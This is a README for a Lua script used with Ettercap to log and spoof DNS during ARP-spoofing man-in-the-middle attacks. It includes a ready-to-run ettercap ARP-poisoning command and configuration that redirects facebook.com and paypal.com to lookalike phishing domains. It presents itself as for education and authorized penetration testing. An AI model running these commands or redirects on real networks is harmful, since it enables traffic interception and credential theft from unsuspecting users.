# DNS Logger & Spoofer for Ettercap

**DNS-logger-spoofer-ettercap** is a powerful Lua script designed for use with Ettercap in a MITM (Man-In-The-Middle) context. It allows you to **log all DNS queries** and **alter DNS responses on the fly**, effectively spoofing IP addresses or redirecting domain names for selected targets on the network.

---

## 📜 Description

This script enhances Ettercap's capabilities by:

- Logging DNS queries from a targeted machine.
- Responding with custom IP addresses for specific domain names.
- Redirecting requested domains to attacker-defined domain names.

It can be used for network diagnostics, penetration testing, and educational demonstrations regarding DNS spoofing and the risks of poorly secured networks.

> ⚠️ **Disclaimer**: This tool is intended for educational and authorized testing purposes only. Unauthorized use against third parties may be illegal.

---

## 🧰 Installation

Place the Lua script `dns_logger2.lua` in the following directory:

```
/usr/share/ettercap/lua/scripts/dns_logger2.lua
```

Ensure Ettercap is installed and has Lua support enabled.

---

## 🚀 Usage

Run the provided `arp_spoof.sh` script with the appropriate parameters:

```bash
bash arp_spoof.sh 192.168.0.1 192 192.168.0.144 dns_logger2
```

- `192.168.0.1` — Gateway IP address.
- `192.168.0.144` — Target IP address.
- `dns_logger2` — The name of the Lua script (without `.lua` extension).

This command executes:

```bash
ettercap -T -q -i wlan0 -M arp:remote /192.168.0.1// /192.168.0.144// --lua-script /usr/share/ettercap/lua/scripts/dns_logger2.lua
```

Placing the target into a MITM situation via ARP spoofing.

---

## ⚙️ Customization

Inside the `dns_logger2.lua` script, two main configuration arrays can be edited:

1. **`custom_hosts`**  
   Define mappings between domain names and spoofed IP addresses.

   ```lua
   local custom_hosts = {
       ["example.com"]      = "192.168.0.1",
       ["somewhere.local"]  = "192.168.50.10",
       ["facebook.com"]     = "127.0.0.2"
   }
   ```

2. **`custom_redirects`**  
   Redirect domains to attacker-defined alternatives.

   ```lua
   local custom_redirects = {
       ["facebook.com"] = "facebouk.com",
       ["paypal.com"] = "paypai.com"
   }
   ```

These configurations enable phishing simulations or demonstrate the impact of DNS manipulation.

---

## 🔒 Real-World Implications

While spoofing IP addresses has its limits due to HTTPS and SSL certificate verification (modern browsers will display warnings), **redirecting domains** can be a dangerous vector for social engineering attacks.

Example:
> A user browsing `facebook.com` could be silently redirected to `facebouk.com`, a malicious domain with a valid SSL certificate, designed to mimic Facebook and steal user credentials.

This demonstrates the **critical importance of securing network access**, especially in environments with weak WiFi passwords or public access.

---

## 🛡️ Disclaimer

This script is provided for **educational and authorized penetration testing** purposes only. The author is **not responsible for any misuse** of this tool.

---

## 🧠 Learn More

To understand how DNS spoofing works and its impact, explore:

- [Ettercap Documentation](https://www.ettercap-project.org/)
- [OWASP DNS Spoofing Guide](https://owasp.org/www-community/attacks/DNS_Spoofing)
